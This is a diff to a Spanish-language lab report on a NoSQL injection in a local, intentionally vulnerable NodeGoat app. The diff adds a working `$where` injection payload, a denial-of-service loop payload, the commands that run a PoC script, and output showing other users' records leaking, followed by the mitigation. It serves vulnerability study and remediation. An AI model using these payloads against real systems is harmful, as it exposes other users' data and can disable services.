@@ -15,15 +15,24 @@
 - Impacto y riesgo: integridad/confidencialidad y disponibilidad — lectura de registros fuera de criterio e incluso denegación por bucle infinito (`'};while(true){}'`). Riesgo alto.
 
 ## 3. Explotación controlada (PoC reproducible)
-- Condición inicial: usuario autenticado; endpoint de allocations accesible.
-- Técnica/herramienta: inyección en el query param `threshold` (navegador / curl).
-- Petición/payload/comando ejecutado:
+- Condición inicial: `vulnerable/` levantada en `http://localhost:4000`, seed por defecto (3 usuarios: admin, user1, user2). Sesión iniciada con la cuenta demo `admin` / `Admin_123`. Solo entorno local.
+- Técnica/herramienta: inyección en el query param `threshold` de `GET /allocations/:userId`, automatizada con `poc-scripts/v2_nosqli.py` (Python, solo lectura). Compara una petición normal contra una con payload.
+- Payload: `threshold = 0' || '1'=='1` → el `$where` evaluado queda como `this.userId == 1 && this.stocks > '0' || '1'=='1'`, que por precedencia (`&&` antes de `||`) es siempre verdadero y devuelve todas las asignaciones.
+- Comando ejecutado:
   ```bash
-  # (Día 3) inyectar condición siempre verdadera para alterar el filtro
-  curl -s "http://localhost:4000/allocations/<id>?threshold=<payload>" -H "Cookie: connect.sid=<sesion>"
+  docker compose -f vulnerable/docker-compose.yml up -d --build
+  BASE=http://localhost:4000 python poc-scripts/v2_nosqli.py
   ```
-- Resultado obtenido: <registros devueltos fuera del criterio esperado> (evidencia: `docs/evidencias/V2/antes/...`)
-- Explicación del impacto: se ejecuta JS arbitrario en el motor Mongo.
+- Resultado obtenido:
+  ```text
+  [V2] Linea base (threshold=-1): 1 fila(s) -> ['Node Goat Admin']
+  [V2] Con inyeccion:             3 fila(s) -> ['John Doe', 'Node Goat Admin', 'Will Smith']
+  [V2] Datos expuestos de otros usuarios: ['John Doe', 'Will Smith']
+  [V2] RESULTADO: VULNERABLE - el $where ejecuto la entrada (A05:2025)
+  EXIT=1
+  ```
+  Evidencia: `docs/evidencias/V2/antes/` (`poc_v2_nosqli.txt`, `README.md`).
+- Explicación del impacto: una petición legítima (threshold=-1) devuelve solo la asignación del usuario de la sesión; con la inyección, el motor ejecuta la condición como JavaScript y entrega las asignaciones de los 3 usuarios. Confirma ejecución de JS server-side (`$where`) y fuga de datos entre usuarios.
 
 ## 4. Mitigación
 - Cambio aplicado: validar y castear `threshold` a entero y rango permitido antes de la consulta; eliminar `$where` siempre que sea posible (usar operadores nativos `$gt`). El propio código vulnerable incluye el fix comentado (`allocations-dao.js:70-75`): `parseInt(threshold,10)` + rango `0..99`.
